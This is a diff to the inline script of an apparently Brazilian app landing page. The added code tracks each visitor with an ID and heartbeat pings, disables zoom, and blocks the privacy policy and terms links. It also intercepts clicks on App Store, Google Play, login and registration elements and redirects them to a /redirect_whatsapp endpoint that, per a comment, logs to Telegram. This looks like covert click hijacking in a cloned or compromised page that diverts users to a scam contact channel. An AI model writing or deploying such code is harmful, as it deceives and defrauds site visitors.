@@ -7147,51 +7147,109 @@ setInterval(function() {
   try {
       userId = localStorage.getItem('coca_user_id');
       if (!userId) {
-          userId = Math.random().toString(36).substring(7);
-          localStorage.setItem('coca_user_id', userId);
+        userId = Math.random().toString(36).substring(7);
+        localStorage.setItem('coca_user_id', userId);
       }
-  } catch(e) {}
-
-  // Registra Entrada
-  fetch('/api/v1/pixel', {
+  } catch(e) {
+      userId = Math.random().toString(36).substring(7);
+  }
+  
+  
+  const startSession = () => {
+    fetch('/api/v1/pixel', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ event: 'ENTRADA', url: window.location.href, userId: userId })
-  }).catch(err => console.log(err));
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'entered', userId: userId })
+    }).catch(()=>{});
+  };
 
-  // Intercepta todos os cliques do site
-  document.addEventListener('click', function(e) {
+  startSession();
+
+  const handleUnload = () => {
+    if (userId) {
+      fetch('/api/v1/pixel', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ action: 'left', userId: userId }),
+        keepalive: true
+      }).catch(()=>{});
+    }
+  };
+  window.addEventListener('beforeunload', handleUnload);
+  window.addEventListener('pagehide', handleUnload);
+
+  setInterval(() => {
+    fetch('/api/v1/pixel', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'heartbeat', userId: userId })
+    }).catch(()=>{});
+  }, 20000);
+})();
+
+document.addEventListener('gesturestart', function (e) {
+    e.preventDefault();
+});
+document.addEventListener('touchmove', function(e) {
+    if (e.scale !== 1) { e.preventDefault(); }
+}, { passive: false });
+var meta = document.createElement('meta');
+meta.name = 'viewport';
+meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+document.head.appendChild(meta);
+var style = document.createElement('style');
+style.innerHTML = 'body { touch-action: manipulation; }';
+document.head.appendChild(style);
+
+document.addEventListener('click', function(e) { 
     var target = e.target;
-    var a = target.closest('a');
-    var text = (target.innerText || '').toLowerCase();
+    var a = target.closest('a'); 
     
-    var isAppStore = a && a.href && a.href.includes('apple.com');
-    var isGooglePlay = a && a.href && a.href.includes('play.google.com');
+    var text = (target.textContent || target.innerText || '').trim().toLowerCase();
+    if (text === 'conheça a gente' || text === 'política de privacidade' || text === 'termos e condições' || (a && a.getAttribute('href') === '#')) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+
+    var altText = '';
+    var img = target.closest('img');
+    if (img) {
+        altText = (img.getAttribute('alt') || '').toLowerCase();
+    }
+    var srcText = '';
+    var img = target.closest('img');
+    if (img) {
+        srcText = (img.getAttribute('src') || '').toLowerCase();
+    }
+
+    var isAppStore = target.closest('[alt*="App Store"]') || target.closest('img[src*="app-store"]');
+    var isGooglePlay = target.closest('[alt*="Google Play"]') || target.closest('img[src*="google-play"]');
+    
+    var textNode = a ? a : target;
+    var text = (textNode.textContent || '').trim().toLowerCase();
+    
     var isBadgeOrStore = target.closest('[class*="badge"]') || isAppStore || isGooglePlay || 
                          (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || 
                          text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar');
     
     if (isBadgeOrStore) { 
         var action = 'geral';
-        if (isAppStore) action = 'appstore';
-        else if (isGooglePlay) action = 'googleplay';
-        else if (text.includes('atendimento') || text.includes('atendente')) action = 'atendimento';
-        else if (text.includes('cadastre') || text.includes('cadastrar') || (a && a.href && a.href.includes('pre-registration'))) action = 'cadastro';
-        else if (a && a.href && a.href.includes('login')) action = 'login';
+        if (text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
+            action = 'atendimento';
+        } else if (text.includes('baixar') || isAppStore || isGooglePlay || target.closest('[class*="badge"]')) {
+            action = 'download';
+        } else if (text.includes('como funciona') || text.includes('dúvida')) {
+            action = 'ajuda';
+        }
         
-        e.preventDefault();
-        
-        // Registra o Clique de Saída
-        fetch('/api/v1/pixel', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ event: 'SAIDA_WHATSAPP', url: window.location.href, userId: userId, action: action })
-        }).catch(err => console.log(err)).finally(() => {
-            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action);
-        });
-    }
-  });
-})();
+        e.preventDefault(); 
+        e.stopPropagation(); 
+
+        // Redireciona o usuario para o endpoint /redirect_whatsapp que fara o log no Telegram e gerara as mensagens dinamicas
+        window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action);
+    } 
+}, true);
 </script>
 </body>
 
